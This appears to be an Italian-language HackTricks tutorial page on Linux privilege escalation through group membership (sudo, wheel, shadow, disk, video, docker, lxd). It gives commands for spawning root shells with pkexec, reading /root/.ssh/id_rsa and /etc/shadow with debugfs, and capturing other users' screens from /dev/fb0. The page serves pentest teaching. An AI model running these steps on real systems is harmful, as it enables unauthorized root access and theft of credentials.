{{#include ../../banners/hacktricks-training.md}}

# Gruppi Sudo/Admin

## **PE - Metodo 1**

**A volte**, **per impostazione predefinita \(o perché alcuni software ne hanno bisogno\)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo sudo o admin può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```text
sudo su
```
## PE - Metodo 2

Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se scopri che il binario pkexec è un binario SUID e appartieni a sudo o admin, probabilmente potresti eseguire binari come sudo utilizzando pkexec. Controlla il contenuto di:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni linux possono **apparire** alcuni dei gruppi **sudo o admin**.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se provi a eseguire **pkexec** e ricevi questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione a questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**A volte**, **per impostazione predefinita** all'interno del **/etc/sudoers** file puoi trovare questa riga:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo wheel può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```text
sudo su
```
# Gruppo Shadow

Gli utenti del **gruppo shadow** possono **leggere** il **/etc/shadow** file:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Quindi, leggi il file e prova a **crackare alcuni hash**.

# Gruppo Disco

Questo privilegio è quasi **equivalente all'accesso root** poiché puoi accedere a tutti i dati all'interno della macchina.

File:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che usando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file di proprietà di root** \(come `/etc/shadow` o `/etc/passwd`\) riceverai un errore di "**Permesso negato**".

# Video Group

Utilizzando il comando `w` puoi scoprire **chi è connesso al sistema** e mostrerà un output simile al seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** significa che l'utente **yossi è connesso fisicamente** a un terminale sulla macchina.

Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per fare ciò, devi **catturare l'immagine corrente sullo schermo** in dati grezzi e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e puoi trovare la risoluzione di questo schermo in `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e selezionare come tipo di file **Dati immagine raw**:

![](../../images/image%20%28208%29.png)

Poi modifica la Larghezza e l'Altezza a quelle utilizzate sullo schermo e controlla diversi Tipi di Immagine \(e seleziona quello che mostra meglio lo schermo\):

![](../../images/image%20%28295%29.png)

# Gruppo Root

Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per elevare i privilegi...

**Controlla quali file i membri root possono modificare**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Gruppo Docker

Puoi montare il filesystem root della macchina host su un volume dell'istanza, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# Gruppo lxc/lxd

[lxc - Privilege Escalation](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
